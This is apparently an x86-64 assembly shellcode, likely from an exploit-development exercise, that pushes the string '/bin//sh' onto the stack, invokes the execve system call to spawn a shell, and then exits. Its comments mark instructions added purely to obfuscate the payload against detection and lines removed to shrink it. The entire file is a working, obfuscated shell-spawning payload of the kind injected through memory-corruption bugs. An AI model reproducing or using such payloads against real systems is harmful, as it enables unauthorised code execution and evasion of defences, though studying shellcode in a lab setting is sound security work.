global _start
section .text
_start:
	xor rdx, rdx		;;Point 1
	xor rsi, rsi
	mul rsi			;Point 1 To multiply 0 to rax
	cld			;Point 2 - This is nothing just add more obfuscation
	mov rbx, 0x68732f6e69622fff
	shr rbx, 0x8
	push rbx
	mov rdi, rsp
	;xor rax, rax		;;Point1
	;push rax		;;Effect from Point1
	;push rdi		;;Effect from Point1
	;mov rsi, rsp		;;hmm?This..No need since 1st place
	mov al, 0x3b
	syscall
    	push 0x1
    	pop rdi
    	push 0x3c   
    	pop rax
    	syscall
